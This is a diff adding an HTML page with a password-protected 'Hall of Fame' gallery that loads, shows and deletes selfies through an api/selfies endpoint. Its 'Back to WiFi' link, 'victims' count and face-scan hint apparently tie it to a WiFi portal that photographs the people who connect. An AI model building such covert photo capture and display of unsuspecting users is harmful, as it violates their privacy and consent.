@@ -1,0 +1,40 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name="robots" content="noindex,nofollow"><meta name="theme-color" content="#101827"><title>Hall of Fame</title><style>
+:root{font-family:Inter,system-ui,-apple-system,Segoe UI,sans-serif;color:#e9f0ff;background:#0b1220}*{box-sizing:border-box}body{margin:0;min-height:100dvh;padding:20px;background:radial-gradient(circle at top,#20345a,#0b1220 60%)}main{width:min(100%,960px);margin:0 auto;background:#131e32;border:1px solid #354360;border-radius:24px;padding:27px;box-shadow:0 24px 70px #0008}h1{font-size:24px;margin:4px 0 12px}.muted{color:#a8b6d1;font-size:13px}.tag{font-size:11px;color:#95bcff;letter-spacing:.13em;text-transform:uppercase}button{font:inherit;padding:13px 18px;border-radius:12px;border:0;background:#6faaff;color:#06152b;font-weight:750;cursor:pointer}button.secondary,a.secondary{display:inline-block;background:#2c3c57;color:#f1f5ff;padding:8px 12px;font-size:13px;border-radius:12px;font-weight:750;text-decoration:none}input{width:100%;padding:13px;background:#0d1729;color:white;border:1px solid #51617b;border-radius:10px;font:inherit;margin:12px 0}.login{max-width:360px}.error{color:#ff9a9a}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:14px;margin-top:18px}.card{background:#0c172a;border:1px solid #334361;border-radius:14px;padding:10px}.card img{width:100%;aspect-ratio:3/4;object-fit:cover;border-radius:10px;background:#07101d;display:block}.row{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-top:8px}.head{display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap}.hidden{display:none!important}
+</style></head><body><main>
+<section id="login" class="login"><div class="tag">Restricted</div><h1>Hall of Fame</h1><p class="muted">Enter the gallery password. Hint: it's what the face scan called you.</p><input id="pw" type="password" autocomplete="current-password" placeholder="Password"><button id="go">View selfies</button><p id="loginErr" class="error"></p></section>
+<section id="gallery" class="hidden"><div class="head"><div><div class="tag">Restricted</div><h1>Hall of Fame</h1><p class="muted" id="count"></p></div><div><a class="secondary" href="./">Back to WiFi</a> <button class="secondary" id="refresh">Refresh</button> <button class="secondary" id="logout">Log out</button></div></div><div class="grid" id="grid"></div></section>
+</main><script>
+const KEY='galleryKey';
+const $=id=>document.getElementById(id);
+const api=(path,opts={})=>fetch(path,{...opts,headers:{...opts.headers,'x-gallery-key':sessionStorage.getItem(KEY)||''}});
+const urls=[];
+async function load(){
+  const res=await api('api/selfies');
+  if(res.status===401){sessionStorage.removeItem(KEY);$('gallery').classList.add('hidden');$('login').classList.remove('hidden');$('loginErr').textContent='Wrong password.';return}
+  if(!res.ok){$('count').textContent='Could not load photos.';return}
+  const {photos,admin}=await res.json();
+  $('login').classList.add('hidden');$('gallery').classList.remove('hidden');
+  urls.splice(0).forEach(u=>URL.revokeObjectURL(u));
+  const grid=$('grid');grid.replaceChildren();
+  $('count').textContent=photos.length===1?'1 victim':`${photos.length} victims`;
+  for(const p of photos){
+    const card=document.createElement('div');card.className='card';
+    const img=document.createElement('img');img.alt='Selfie';
+    const row=document.createElement('div');row.className='row';
+    const when=document.createElement('span');when.className='muted';when.textContent=new Date(p.uploadedAt).toLocaleString();
+    const del=document.createElement('button');del.className='secondary';del.textContent='Delete';
+    del.addEventListener('click',async()=>{
+      if(!confirm('Delete this selfie?'))return;
+      const r=await api('api/selfies?path='+encodeURIComponent(p.pathname),{method:'DELETE'});
+      if(r.ok)load();else alert('Delete failed.');
+    });
+    row.append(when);if(admin)row.append(del);card.append(img,row);grid.append(card);
+    api('api/selfies?path='+encodeURIComponent(p.pathname)).then(r=>r.ok?r.blob():null).then(b=>{if(b){const u=URL.createObjectURL(b);urls.push(u);img.src=u}});
+  }
+}
+$('go').addEventListener('click',()=>{const v=$('pw').value;if(!v)return;sessionStorage.setItem(KEY,v);$('loginErr').textContent='';load()});
+$('pw').addEventListener('keydown',e=>{if(e.key==='Enter')$('go').click()});
+$('refresh').addEventListener('click',load);
+$('logout').addEventListener('click',()=>{sessionStorage.removeItem(KEY);location.reload()});
+if(sessionStorage.getItem(KEY))load();
+</script></body></html>
